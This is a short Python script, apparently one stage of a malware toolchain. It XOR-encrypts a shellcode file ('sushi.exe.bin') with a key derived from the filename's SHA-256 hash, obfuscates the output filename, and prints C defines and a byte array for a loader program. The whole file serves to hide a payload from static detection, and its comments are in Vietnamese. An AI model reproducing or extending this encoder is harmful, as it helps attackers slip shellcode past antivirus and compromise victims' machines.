# encode_shellcode.py
import os
import hashlib

def generate_key(filename):
    """Tạo dynamic key từ file hash"""
    h = hashlib.sha256(filename.encode()).digest()
    return h[0]  # Key = byte đầu tiên của SHA256(tên file)

def xor_encrypt(data, key):
    return bytes([b ^ key for b in data])

def obfuscate_string(s, key):
    """XOR obfuscate string để giấu tên file"""
    return bytes([ord(c) ^ ((key + i) & 0xFF) for i, c in enumerate(s)])

# Config
input_file = "sushi.exe.bin"
output_file = "sushi_encoded.bin"

# Generate key
key = generate_key(input_file)
print(f"[+] Generated key: 0x{key:02X}")

# Read and encrypt
with open(input_file, "rb") as f:
    shellcode = f.read()

encoded = xor_encrypt(shellcode, key)
with open(output_file, "wb") as f:
    f.write(encoded)

# Generate obfuscated filename string
obfuscated = obfuscate_string(output_file + "\0", key)
print(f"[+] Obfuscated filename bytes: {list(obfuscated)}")
print(f"[+] Original length: {len(shellcode)} bytes")
print(f"[+] Encoded length: {len(encoded)} bytes")
print(f"[+] Output: {output_file}")

# Save key để dùng cho C code
print(f"\n#define XOR_KEY 0x{key:02X}")
print(f"#define FILENAME_LEN {len(output_file)}")
print(f"unsigned char obfuscated_filename[] = {{{', '.join(f'0x{b:02X}' for b in obfuscated)}}};")
